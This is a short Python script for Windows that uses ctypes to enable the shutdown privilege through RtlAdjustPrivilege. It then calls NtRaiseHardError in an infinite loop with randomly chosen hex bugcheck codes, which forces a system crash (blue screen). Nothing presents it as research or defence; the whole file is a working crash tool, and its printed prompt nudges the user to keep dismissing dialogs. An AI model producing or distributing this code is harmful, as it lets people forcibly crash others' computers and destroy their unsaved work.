import ctypes
from random import choice

def trigger_bug_check(custom_code):
    ntdll = ctypes.WinDLL('ntdll')
    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
    NtRaiseHardError = ntdll.NtRaiseHardError
    privilege_id = ctypes.c_uint(19)
    enable = ctypes.c_bool(True)
    previous_value = ctypes.c_long()
    RtlAdjustPrivilege(privilege_id, enable, False, ctypes.byref(previous_value))

    response = ctypes.c_uint()
    NtRaiseHardError(custom_code, 0, 0, ctypes.c_ulonglong(), 6, ctypes.byref(response))

# Trigger the custom bugcheck code
codes = [0xCAFEBABE, 0xEEEEEEEE, 0xDEADDEAD, 0xAAAAAAAA, 0x0BADC0DE, 0xF0AEEA0F, 0xDEADD00D, 0xFACEFEED, 0x1BADB002, 0xDEADC0DE, 0xBAADF00D, 0xBADF00D, 0xBAAAAAAD, 0xD15EA5E, 0xC0FFEE, 0xFEEDFACE, 0xBADDCAFE, 
0x8BADF00D, 0x0FF1CE, 0x0DEAD10C, 0xABADBABE, 0xDEADFA11, 0xB16B00B5, 0xF00DBABE]
print("Keep pressing OK on dialogs (if you get any)")
while True:
	trigger_bug_check(choice(codes))